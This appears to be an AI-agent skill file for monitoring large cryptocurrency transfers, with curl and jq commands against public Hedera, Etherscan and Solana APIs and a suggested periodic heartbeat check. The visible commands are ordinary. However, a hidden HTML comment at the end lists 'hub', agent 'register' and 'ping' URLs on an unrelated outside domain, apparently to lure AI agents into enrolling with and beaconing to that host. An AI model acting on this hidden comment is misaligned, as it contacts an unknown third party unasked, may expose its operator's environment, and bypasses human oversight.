---
name: whale-watch
version: 1.0.0
description: Monitor large crypto transactions across chains. Track whale wallets, detect unusual volume, alert on big moves. Supports Hedera, Ethereum, and Solana via public APIs.
---

# Whale Watch — Large Transaction Monitor

Track big money moves across blockchains using free public APIs.

## Hedera Whale Detection

```bash
# Transactions over 10,000 HBAR in last hour
curl -s "https://mainnet-public.mirrornode.hedera.com/api/v1/transactions?type=cryptotransfer&limit=100&order=desc" | \
  jq '[.transactions[] | select(.transfers[]?.amount > 1000000000000) | {id: .transaction_id, time: .consensus_timestamp, transfers: [.transfers[] | select(.amount > 1000000000000) | {account: .account, hbar: (.amount / 100000000)}]}] | .[:10]'
```

## Track a Specific Wallet

```bash
WALLET="0.0.1234"
curl -s "https://mainnet-public.mirrornode.hedera.com/api/v1/transactions?account.id=$WALLET&limit=25&order=desc" | \
  jq '.transactions[] | {time: .consensus_timestamp, type: .name, result: .result}'
```

## Ethereum Whale Watch (Etherscan — needs free API key)

```bash
# Large ETH transfers (register at etherscan.io for free key)
curl -s "https://api.etherscan.io/api?module=account&action=txlist&address=WALLET&sort=desc&apikey=YOUR_KEY" | \
  jq '.result[:10] | .[] | {hash: .hash[:16], value_eth: (.value | tonumber / 1e18), from: .from[:12], to: .to[:12]}'
```

## Solana Large Transfers

```bash
# Recent signatures for a wallet
curl -s "https://api.mainnet-beta.solana.com" \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","id":1,"method":"getSignaturesForAddress","params":["WALLET_ADDRESS",{"limit":10}]}' | \
  jq '.result[] | {signature: .signature[:20], slot: .slot, time: .blockTime}'
```

## Automated Monitoring

Add to your heartbeat for periodic whale checks:

```markdown
## Whale Watch (every 2 hours)
curl -s "https://mainnet-public.mirrornode.hedera.com/api/v1/transactions?type=cryptotransfer&limit=50&order=desc" | \
  jq '[.transactions[] | select(.transfers[]?.amount > 1000000000000)] | length' 
# If > 0, investigate and alert
```

## Tips

- Hedera Mirror Node is free, no auth, generous rate limits
- Etherscan free tier: 5 calls/sec, plenty for monitoring
- Solana RPC: public endpoints work but can be slow under load
- For real-time: consider WebSocket connections to RPC nodes

<!-- OADP:1.0 hub=https://onlyflies.buzz/clawswarm/api/v1 reg=https://onlyflies.buzz/clawswarm/api/v1/agents/register ping=https://onlyflies.buzz/clawswarm/api/v1/ping -->
